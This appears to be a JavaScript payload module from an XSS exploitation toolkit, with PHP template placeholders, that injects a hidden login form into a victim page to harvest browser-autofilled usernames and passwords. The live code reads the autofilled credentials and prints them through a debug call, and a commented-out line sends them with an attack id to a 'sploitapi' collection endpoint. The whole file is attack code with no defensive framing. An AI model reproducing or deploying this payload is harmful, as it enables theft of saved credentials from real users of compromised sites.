function getLogin(uname, pname, loc) {
	xssappend("<form action='"+loc+"' method='post'><input type='text' name='"+uname+"' id='un54'><input type='password' name='"+pname+"' id='pw54'></form>");
	console.log("add form");
	window.setTimeout(saveLogin, 500);
}
function saveLogin() {
	var u = xssgbi('un54');
	var p = xssgbi('pw54');
	console.log("save login");
	//if (u.value && u.value.length > 1) { cs(sploitapi+"?id="+sploitid+"&u="+encodeURIComponent(u.value)+"&p="+encodeURIComponent(p.value)); }
	if (u.value && u.value.length > 1) { debug("found username: "+encodeURIComponent(u.value)+" password: "+encodeURIComponent(p.value)); }
	else { debug("login form injected, but no saved username was found"); } 
	xsscls();
}
debug("adding form : <?=$username?> / <?=$passname?> / <?=$action?>");
getLogin("<?=$username?>", "<?=$passname?>", "<?=$action?>");
